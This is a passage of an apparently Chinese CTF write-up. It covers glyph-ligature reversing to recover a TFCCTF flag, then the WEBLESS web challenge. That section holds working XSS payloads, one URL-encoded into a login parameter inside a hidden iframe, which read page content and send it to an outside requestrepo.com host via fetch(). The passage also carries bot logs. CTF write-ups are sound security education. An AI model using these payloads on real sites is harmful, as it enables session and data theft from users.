</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>-&gt;</span> <span class=n>p</span>
</span></span><span class=line><span class=cl><span class=n>q</span> <span class=o>-&gt;</span> <span class=n>q</span>
</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>-&gt;</span> <span class=n>r</span>
</span></span><span class=line><span class=cl><span class=n>s</span> <span class=o>-&gt;</span> <span class=n>s</span>
</span></span><span class=line><span class=cl><span class=n>t</span> <span class=o>-&gt;</span> <span class=n>t</span>
</span></span><span class=line><span class=cl><span class=n>u</span> <span class=o>-&gt;</span> <span class=n>u</span>
</span></span><span class=line><span class=cl><span class=n>v</span> <span class=o>-&gt;</span> <span class=n>v</span>
</span></span><span class=line><span class=cl><span class=n>w</span> <span class=o>-&gt;</span> <span class=n>w</span>
</span></span><span class=line><span class=cl><span class=n>x</span> <span class=o>-&gt;</span> <span class=n>x</span>
</span></span><span class=line><span class=cl><span class=n>y</span> <span class=o>-&gt;</span> <span class=n>y</span>
</span></span><span class=line><span class=cl><span class=n>z</span> <span class=o>-&gt;</span> <span class=n>z</span>
</span></span><span class=line><span class=cl><span class=n>braceleft</span> <span class=o>-&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl><span class=n>bar</span> <span class=o>-&gt;</span> <span class=o>|</span>
</span></span><span class=line><span class=cl><span class=n>braceright</span> <span class=o>-&gt;</span> <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>asciitilde</span> <span class=o>-&gt;</span> <span class=o>~</span>
</span></span><span class=line><span class=cl><span class=n>exclamdown</span> <span class=o>-&gt;</span> <span class=err>¡</span>
</span></span><span class=line><span class=cl><span class=n>cent</span> <span class=o>-&gt;</span> <span class=err>¢</span>
</span></span><span class=line><span class=cl><span class=n>sterling</span> <span class=o>-&gt;</span> <span class=err>£</span>
</span></span><span class=line><span class=cl><span class=n>currency</span> <span class=o>-&gt;</span> <span class=err>¤</span>
</span></span><span class=line><span class=cl><span class=n>yen</span> <span class=o>-&gt;</span> <span class=err>¥</span>
</span></span><span class=line><span class=cl><span class=n>brokenbar</span> <span class=o>-&gt;</span> <span class=err>¦</span>
</span></span><span class=line><span class=cl><span class=n>section</span> <span class=o>-&gt;</span> <span class=err>§</span>
</span></span></code></pre></td></tr></table></div></div><p>需要通过逆向联接来重建输入字符串，追溯每个字形的联接规则。通过递归反向映射，最终找出原始输入的字形。</p><p>通过递归展开目标字形，生成符合条件的字符串。利用深度优先搜索和备忘录，可以优化扩展，尽量避免指数级增长。如果是哈希树，应该只有一条学习路径，我们可以先测试。</p><p>为了避免过多生成，我们定义了一个 <code>expand(glyph)</code> 函数，它返回可能的字符串列表。通过深度优先搜索并结合约束限制，我们可以实现更有效的扩展。在展开时，只探索每对唯一的映射。我还考虑检查目标根字形的逆向路径复杂度，看是否只会有一条解构路径。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>arget</span><span class=o>=</span><span class=s1>&#39;O162e219bca79a462f9cf5701124cf74c&#39;</span>
</span></span><span class=line><span class=cl><span class=c1># build reverse mapping</span>
</span></span><span class=line><span class=cl><span class=n>rev</span> <span class=o>=</span> <span class=p>{}</span>
</span></span><span class=line><span class=cl><span class=n>count_rules</span><span class=o>=</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>lookup</span> <span class=ow>in</span> <span class=n>lookupList</span><span class=o>.</span><span class=n>Lookup</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>lookup</span><span class=o>.</span><span class=n>LookupType</span><span class=o>!=</span><span class=mi>4</span><span class=p>:</span> <span class=k>continue</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>st</span> <span class=ow>in</span> <span class=n>lookup</span><span class=o>.</span><span class=n>SubTable</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=ow>not</span> <span class=nb>hasattr</span><span class=p>(</span><span class=n>st</span><span class=p>,</span><span class=s1>&#39;ligatures&#39;</span><span class=p>):</span> <span class=k>continue</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>start_glyph</span><span class=p>,</span> <span class=n>lig_list</span> <span class=ow>in</span> <span class=n>st</span><span class=o>.</span><span class=n>ligatures</span><span class=o>.</span><span class=n>items</span><span class=p>():</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=n>lig</span> <span class=ow>in</span> <span class=n>lig_list</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=c1># only bigrams assumed</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>lig</span><span class=o>.</span><span class=n>Component</span><span class=p>)</span><span class=o>!=</span><span class=mi>1</span><span class=p>:</span> 
</span></span><span class=line><span class=cl>                    <span class=k>pass</span>
</span></span><span class=line><span class=cl>                <span class=n>a</span><span class=o>=</span><span class=n>start_glyph</span>
</span></span><span class=line><span class=cl>                <span class=n>b</span><span class=o>=</span><span class=n>lig</span><span class=o>.</span><span class=n>Component</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=k>if</span> <span class=n>lig</span><span class=o>.</span><span class=n>Component</span> <span class=k>else</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>                <span class=n>c</span><span class=o>=</span><span class=n>lig</span><span class=o>.</span><span class=n>LigGlyph</span>
</span></span><span class=line><span class=cl>                <span class=n>rev</span><span class=o>.</span><span class=n>setdefault</span><span class=p>(</span><span class=n>c</span><span class=p>,</span> <span class=p>[])</span><span class=o>.</span><span class=n>append</span><span class=p>((</span><span class=n>a</span><span class=p>,</span><span class=n>b</span><span class=p>))</span>
</span></span><span class=line><span class=cl>                <span class=n>count_rules</span><span class=o>+=</span><span class=mi>1</span>
</span></span><span class=line><span class=cl><span class=n>count_rules</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>rev</span><span class=p>[</span><span class=n>target</span><span class=p>]),</span> <span class=n>rev</span><span class=p>[</span><span class=n>target</span><span class=p>][:</span><span class=mi>10</span><span class=p>]</span>
</span></span></code></pre></td></tr></table></div></div><p>输出得到：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>(2091,  1,  [(&#39;O0dd4bbd1dc3031e7985b2c4b2caee3b0&#39;, &#39;Od37ba43eb880c76fd73cf4d8044d97ad&#39;)])
</span></span></code></pre></td></tr></table></div></div><p>只有一个逆向配对，表明存在唯一的路径，最终能够将其映射到ASCII。接下来，我将实现递归扩展，直到达到那些直接映射到Unicode字符（可能是ASCII）的叶子节点。停止条件是当两子节点都不在逆向映射键中时。</p><p>然后通过递归扩展收集叶子结点</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>sys</span><span class=o>.</span><span class=n>setrecursionlimit</span><span class=p>(</span><span class=mi>10000</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>expand_to_leaves</span><span class=p>(</span><span class=n>g</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=c1># returns list of leaf glyph names in order</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>g</span> <span class=ow>in</span> <span class=n>rev</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>a</span><span class=p>,</span><span class=n>b</span> <span class=o>=</span> <span class=n>rev</span><span class=p>[</span><span class=n>g</span><span class=p>][</span><span class=mi>0</span><span class=p>]</span>  <span class=c1># assume unique</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>expand_to_leaves</span><span class=p>(</span><span class=n>a</span><span class=p>)</span><span class=o>+</span><span class=n>expand_to_leaves</span><span class=p>(</span><span class=n>b</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=p>[</span><span class=n>g</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>leaves</span> <span class=o>=</span> <span class=n>expand_to_leaves</span><span class=p>(</span><span class=n>target</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>len</span><span class=p>(</span><span class=n>leaves</span><span class=p>),</span> <span class=n>leaves</span><span class=p>[:</span><span class=mi>10</span><span class=p>]</span>
</span></span></code></pre></td></tr></table></div></div><p>得到(64, [&lsquo;one&rsquo;, &lsquo;f&rsquo;, &rsquo;eight&rsquo;, &rsquo;nine&rsquo;, &lsquo;a&rsquo;, &rsquo;nine&rsquo;, &lsquo;five&rsquo;, &lsquo;seven&rsquo;, &lsquo;a&rsquo;, &lsquo;zero&rsquo;])</p><p>再按照mapping.txt的规则进行转换，有</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c++ data-lang=c++><span class=line><span class=cl><span class=n>def</span> <span class=n>leaf_to_char</span><span class=p>(</span><span class=n>name</span><span class=p>)</span><span class=o>:</span>
</span></span><span class=line><span class=cl>    <span class=n>ch</span> <span class=o>=</span> <span class=n>glyph_to_char</span><span class=p>(</span><span class=n>name</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>ch</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=o>=</span><span class=err>&#39;&#39;</span><span class=p>.</span><span class=n>join</span><span class=p>(</span><span class=n>leaf_to_char</span><span class=p>(</span><span class=n>n</span><span class=p>)</span> <span class=k>for</span> <span class=n>n</span> <span class=n>in</span> <span class=n>leaves</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>,</span> <span class=p>[</span> <span class=p>(</span><span class=n>n</span><span class=p>,</span> <span class=n>leaf_to_char</span><span class=p>(</span><span class=n>n</span><span class=p>))</span> <span class=k>for</span> <span class=n>n</span> <span class=n>in</span> <span class=n>leaves</span><span class=p>[</span><span class=o>:</span><span class=mi>20</span><span class=p>]</span> <span class=p>]</span>
</span></span></code></pre></td></tr></table></div></div><p>得到</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=p>(</span><span class=s1>&#39;1f89a957a0816e3bea3fa026cd9a47cf181fb2c0e0c9e9442a2c783b01c083d2&#39;</span><span class=p>,</span><span class=w>  </span><span class=p>[(</span><span class=s1>&#39;one&#39;</span><span class=p>,</span><span class=w> </span><span class=s1>&#39;1&#39;</span><span class=p>),</span><span class=w>   </span><span class=p>(</span><span class=s1>&#39;f&#39;</span><span class=p>,</span><span class=w> </span><span class=s1>&#39;f&#39;</span><span class=p>),</span><span class=w>   </span><span class=p>(</span><span class=s1>&#39;eight&#39;</span><span class=p>,</span><span class=w> </span><span class=s1>&#39;8&#39;</span><span class=p>),</span><span class=w>   </span><span class=p>(</span><span class=s1>&#39;nine&#39;</span><span class=p>,</span><span class=w> </span><span class=s1>&#39;9&#39;</span><span class=p>),</span><span class=w>   </span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=p>,</span><span class=w> </span><span class=s1>&#39;a&#39;</span><span class=p>),</span><span class=w>   </span><span class=p>(</span><span class=s1>&#39;nine&#39;</span><span class=p>,</span><span class=w> </span><span class=s1>&#39;9&#39;</span><span class=p>),</span><span class=w>   </span><span class=p>(</span><span class=s1>&#39;five&#39;</span><span class=p>,</span><span class=w> </span><span class=s1>&#39;5&#39;</span><span class=p>),</span><span class=w>   </span><span class=p>(</span><span class=s1>&#39;seven&#39;</span><span class=p>,</span><span class=w> </span><span class=s1>&#39;7&#39;</span><span class=p>),</span><span class=w>   </span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=p>,</span><span class=w> </span><span class=s1>&#39;a&#39;</span><span class=p>),</span><span class=w>   </span><span class=p>(</span><span class=s1>&#39;zero&#39;</span><span class=p>,</span><span class=w> </span><span class=s1>&#39;0&#39;</span><span class=p>),</span><span class=w>   </span><span class=p>(</span><span class=s1>&#39;eight&#39;</span><span class=p>,</span><span class=w> </span><span class=s1>&#39;8&#39;</span><span class=p>),</span><span class=w>   </span><span class=p>(</span><span class=s1>&#39;one&#39;</span><span class=p>,</span><span class=w> </span><span class=s1>&#39;1&#39;</span><span class=p>),</span><span class=w>   </span><span class=p>(</span><span class=s1>&#39;six&#39;</span><span class=p>,</span><span class=w> </span><span class=s1>&#39;6&#39;</span><span class=p>),</span><span class=w>   </span><span class=p>(</span><span class=s1>&#39;e&#39;</span><span class=p>,</span><span class=w> </span><span class=s1>&#39;e&#39;</span><span class=p>),</span><span class=w>   </span><span class=p>(</span><span class=s1>&#39;three&#39;</span><span class=p>,</span><span class=w> </span><span class=s1>&#39;3&#39;</span><span class=p>),</span><span class=w>   </span><span class=p>(</span><span class=s1>&#39;b&#39;</span><span class=p>,</span><span class=w> </span><span class=s1>&#39;b&#39;</span><span class=p>),</span><span class=w>   </span><span class=p>(</span><span class=s1>&#39;e&#39;</span><span class=p>,</span><span class=w> </span><span class=s1>&#39;e&#39;</span><span class=p>),</span><span class=w>   </span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=p>,</span><span class=w> </span><span class=s1>&#39;a&#39;</span><span class=p>),</span><span class=w>   </span><span class=p>(</span><span class=s1>&#39;three&#39;</span><span class=p>,</span><span class=w> </span><span class=s1>&#39;3&#39;</span><span class=p>),</span><span class=w>   </span><span class=p>(</span><span class=s1>&#39;f&#39;</span><span class=p>,</span><span class=w> </span><span class=s1>&#39;f&#39;</span><span class=p>)])</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>最后flag即为TFCCTF{1f89a957a0816e3bea3fa026cd9a47cf181fb2c0e0c9e9442a2c783b01c083d2}</p><p>询问gpt的思考过程：https://chatgpt.com/share/68b1b28f-6008-8000-8abd-c756c9e0b572</p><h1 id=web>Web</h1><h2 id=webless>WEBLESS</h2><blockquote><p>获得reffer似乎可行可行的思路</p></blockquote><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=o>&lt;</span><span class=nx>script</span><span class=o>&gt;</span><span class=nx>fetch</span><span class=p>(</span><span class=err>&#39;</span><span class=nx>https</span><span class=o>:</span><span class=c1>//kws1oh3y.requestrepo.com:8000/collect?ref=${document.referrer}&lt;/script&gt;
</span></span></span></code></pre></td></tr></table></div></div><p>但是题目禁止任何内联脚本</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=nx>resp</span><span class=p>.</span><span class=nx>headers</span><span class=p>[</span><span class=s2>&#34;Content-Security-Policy&#34;</span><span class=p>]</span> <span class=o>=</span> <span class=s2>&#34;script-src &#39;none&#39;; style-src &#39;self&#39;&#34;</span>
</span></span></code></pre></td></tr></table></div></div><p>密码错误也能导致xss,且没有安全头</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span> <span class=m>401</span> <span class=ne>UNAUTHORIZED</span>
</span></span><span class=line><span class=cl><span class=n>Server</span><span class=o>:</span> <span class=l>Werkzeug/3.1.3 Python/3.12.11</span>
</span></span><span class=line><span class=cl><span class=n>Date</span><span class=o>:</span> <span class=l>Sat, 30 Aug 2025 00:54:41 GMT</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>text/html; charset=utf-8</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>1682</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
</span></span></code></pre></td></tr></table></div></div><p>iframe 与父同域，iframe 似乎可获取父域dom?</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>parent</span> <span class=o>=</span> <span class=nb>window</span><span class=p>.</span><span class=nx>parent</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>iframe</span> <span class=o>=</span> <span class=nx>parent</span><span class=p>.</span><span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s1>&#39;flag&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>iframeDoc</span> <span class=o>=</span> <span class=nx>iframe</span><span class=p>.</span><span class=nx>contentDocument</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>flag</span> <span class=o>=</span> <span class=nx>iframeDoc</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s1>&#39;description&#39;</span><span class=p>).</span><span class=nx>innerText</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nx>fetch</span><span class=p>(</span><span class=s1>&#39;https://kws1oh3y.requestrepo.com/?flag=&#39;</span><span class=o>+</span><span class=nx>flag</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>iframe</span> <span class=na>id</span><span class=o>=</span><span class=s>&#34;flag&#34;</span> <span class=na>src</span><span class=o>=</span><span class=s>&#34;/post/0&#34;</span> <span class=na>style</span><span class=o>=</span><span class=s>&#34;width:0;height:0;border:0;visibility:hidden&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>iframe</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>img</span> <span class=na>a</span><span class=o>=</span><span class=s>&#34;wait&#34;</span> <span class=na>src</span><span class=o>=</span><span class=s>/</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>img</span> <span class=na>a</span><span class=o>=</span><span class=s>&#34;wait&#34;</span> <span class=na>src</span><span class=o>=</span><span class=s>/</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>img</span> <span class=na>a</span><span class=o>=</span><span class=s>&#34;wait&#34;</span> <span class=na>src</span><span class=o>=</span><span class=s>/</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>img</span> <span class=na>a</span><span class=o>=</span><span class=s>&#34;wait&#34;</span> <span class=na>src</span><span class=o>=</span><span class=s>/</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>img</span> <span class=na>a</span><span class=o>=</span><span class=s>&#34;wait&#34;</span> <span class=na>src</span><span class=o>=</span><span class=s>/</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>img</span> <span class=na>a</span><span class=o>=</span><span class=s>&#34;wait&#34;</span> <span class=na>src</span><span class=o>=</span><span class=s>/</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>img</span> <span class=na>a</span><span class=o>=</span><span class=s>&#34;wait&#34;</span> <span class=na>src</span><span class=o>=</span><span class=s>/</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>iframe</span> <span class=na>credentialless</span> <span class=na>src</span><span class=o>=</span><span class=s>&#34;/login?username=%3Cscript%3E%0Aconst%20parent%20%3D%20window%2Eparent%3B%0Aconst%20iframe%20%3D%20parent%2Edocument%2EgetElementById%28%27flag%27%29%3B%0Aconst%20iframeDoc%20%3D%20iframe%2EcontentDocument%3B%0Aconst%20flag%20%3D%20iframeDoc%2EgetElementById%28%27description%27%29%2EinnerText%3B%0Afetch%28%27https%3A%2F%2Fkws1oh3y%2Erequestrepo%2Ecom%2F%3Fflag%3D%27%2Bflag%29%0A%3C%2Fscript%3E&amp;password=admin&#34;</span> <span class=na>style</span><span class=o>=</span><span class=s>&#34;width:0;height:0;border:0;visibility:hidden&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>iframe</span><span class=p>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>这在我的浏览器上成功了,但是为什么bot不行？</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>app</span><span class=o>-</span><span class=mi>1</span>  <span class=o>|</span> <span class=mf>192.168</span><span class=o>.</span><span class=mf>18.173</span> <span class=o>-</span> <span class=o>-</span> <span class=p>[</span><span class=mi>30</span><span class=o>/</span><span class=n>Aug</span><span class=o>/</span><span class=mi>2025</span> <span class=mi>02</span><span class=p>:</span><span class=mi>04</span><span class=p>:</span><span class=mi>31</span><span class=p>]</span> <span class=s2>&#34;POST /report HTTP/1.1&#34;</span> <span class=mi>202</span> <span class=o>-</span>
</span></span><span class=line><span class=cl><span class=n>app</span><span class=o>-</span><span class=mi>1</span>  <span class=o>|</span> <span class=mf>127.0</span><span class=o>.</span><span class=mf>0.1</span> <span class=o>-</span> <span class=o>-</span> <span class=p>[</span><span class=mi>30</span><span class=o>/</span><span class=n>Aug</span><span class=o>/</span><span class=mi>2025</span> <span class=mi>02</span><span class=p>:</span><span class=mi>04</span><span class=p>:</span><span class=mi>32</span><span class=p>]</span> <span class=s2>&#34;GET /login?username=27ffe8f85d20e7bae3ad45680567f64671a94b1a4708d96546dfb63788b84c6e&amp;password=fb1a60ff69b9d842b9bcba78b930baa0d8de1420b210453b527188125c405264 HTTP/1.1&#34;</span> <span class=mi>302</span> <span class=o>-</span>
</span></span><span class=line><span class=cl><span class=n>app</span><span class=o>-</span><span class=mi>1</span>  <span class=o>|</span> <span class=mf>127.0</span><span class=o>.</span><span class=mf>0.1</span> <span class=o>-</span> <span class=o>-</span> <span class=p>[</span><span class=mi>30</span><span class=o>/</span><span class=n>Aug</span><span class=o>/</span><span class=mi>2025</span> <span class=mi>02</span><span class=p>:</span><span class=mi>04</span><span class=p>:</span><span class=mi>32</span><span class=p>]</span> <span class=s2>&#34;GET / HTTP/1.1&#34;</span> <span class=mi>200</span> <span class=o>-</span>
</span></span><span class=line><span class=cl><span class=n>app</span><span class=o>-</span><span class=mi>1</span>  <span class=o>|</span> <span class=mf>127.0</span><span class=o>.</span><span class=mf>0.1</span> <span class=o>-</span> <span class=o>-</span> <span class=p>[</span><span class=mi>30</span><span class=o>/</span><span class=n>Aug</span><span class=o>/</span><span class=mi>2025</span> <span class=mi>02</span><span class=p>:</span><span class=mi>04</span><span class=p>:</span><span class=mi>32</span><span class=p>]</span> <span class=s2>&#34;GET /favicon.ico HTTP/1.1&#34;</span> <span class=mi>404</span> <span class=o>-</span>
</span></span><span class=line><span class=cl><span class=n>app</span><span class=o>-</span><span class=mi>1</span>  <span class=o>|</span> <span class=n>Login</span> <span class=n>page</span> <span class=n>fully</span> <span class=n>loaded</span>
</span></span><span class=line><span class=cl><span class=n>app</span><span class=o>-</span><span class=mi>1</span>  <span class=o>|</span> <span class=n>Visiting</span><span class=p>:</span> <span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=mf>192.168</span><span class=o>.</span><span class=mf>18.158</span><span class=p>:</span><span class=mi>5000</span><span class=o>/</span><span class=n>post</span><span class=o>/</span><span class=mi>12</span>
</span></span><span class=line><span class=cl><span class=n>app</span><span class=o>-</span><span class=mi>1</span>  <span class=o>|</span> <span class=mf>172.18</span><span class=o>.</span><span class=mf>0.1</span> <span class=o>-</span> <span class=o>-</span> <span class=p>[</span><span class=mi>30</span><span class=o>/</span><span class=n>Aug</span><span class=o>/</span><span class=mi>2025</span> <span class=mi>02</span><span class=p>:</span><span class=mi>04</span><span class=p>:</span><span class=mi>32</span><span class=p>]</span> <span class=s2>&#34;GET /post/12 HTTP/1.1&#34;</span> <span class=mi>302</span> <span class=o>-</span>
</span></span><span class=line><span class=cl><span class=n>app</span><span class=o>-</span><span class=mi>1</span>  <span class=o>|</span> <span class=mf>172.18</span><span class=o>.</span><span class=mf>0.1</span> <span class=o>-</span> <span class=o>-</span> <span class=p>[</span><span class=mi>30</span><span class=o>/</span><span class=n>Aug</span><span class=o>/</span><span class=mi>2025</span> <span class=mi>02</span><span class=p>:</span><span class=mi>04</span><span class=p>:</span><span class=mi>32</span><span class=p>]</span> <span class=s2>&#34;GET /login HTTP/1.1&#34;</span> <span class=mi>200</span> <span class=o>-</span>
</span></span><span class=line><span class=cl><span class=n>app</span><span class=o>-</span><span class=mi>1</span>  <span class=o>|</span> <span class=mf>172.18</span><span class=o>.</span><span class=mf>0.1</span> <span class=o>-</span> <span class=o>-</span> <span class=p>[</span><span class=mi>30</span><span class=o>/</span><span class=n>Aug</span><span class=o>/</span><span class=mi>2025</span> <span class=mi>02</span><span class=p>:</span><span class=mi>04</span><span class=p>:</span><span class=mi>32</span><span class=p>]</span> <span class=s2>&#34;GET /favicon.ico HTTP/1.1&#34;</span> <span class=mi>404</span> <span class=o>-</span>
</span></span><span class=line><span class=cl><span class=n>app</span><span class=o>-</span><span class=mi>1</span>  <span class=o>|</span> <span class=p>[</span><span class=n>BOT</span><span class=p>]</span> <span class=n>Error</span><span class=p>:</span> <span class=n>Message</span><span class=p>:</span> 
</span></span><span class=line><span class=cl><span class=n>app</span><span class=o>-</span><span class=mi>1</span>  <span class=o>|</span> 
</span></span><span class=line><span class=cl><span class=n>app</span><span class=o>-</span><span class=mi>1</span>  <span class=o>|</span> <span class=n>Browser</span> <span class=n>closed</span><span class=o>.</span>
</span></span><span class=line><span class=cl><span class=n>app</span><span class=o>-</span><span class=mi>1</span>  <span class=o>|</span> <span class=p>[</span><span class=n>BOT</span><span class=p>]</span> <span class=n>Done</span>
</span></span></code></pre></td></tr></table></div></div><p>bot似乎没有加载iframe?</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>driver.get(f&#34;http://127.0.0.1:5000/login?username={username}&amp;password={password}&#34;)
</span></span></code></pre></td></tr></table></div></div><p>尝试提交127.0.0.1</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>url=http%3a%2f%2f127.0.0.1%3a5000%2fpost%2f12
